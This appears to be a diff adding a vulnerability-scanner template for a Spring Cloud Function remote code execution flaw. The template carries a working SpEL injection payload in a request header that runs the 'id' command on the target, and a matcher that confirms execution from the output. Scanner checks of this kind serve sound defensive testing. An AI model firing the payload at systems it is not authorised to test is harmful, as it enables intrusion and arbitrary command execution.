@@ -1,0 +1,14 @@
+id: K70n0s510-spring-function
+info:
+  name: Spring Cloud Function SpEL RCE
+  author: K70n0s510
+  severity: critical
+  tags: rce,spring,spel
+http:
+  - method: POST
+    path: ["{{BaseURL}}/functionRouter"]
+    headers:
+      spring.cloud.function.routing-expression: "T(java.lang.Runtime).getRuntime().exec('id')"
+    matchers:
+      - type: regex
+        regex: ["uid=[0-9]+.*gid=[0-9]+"]
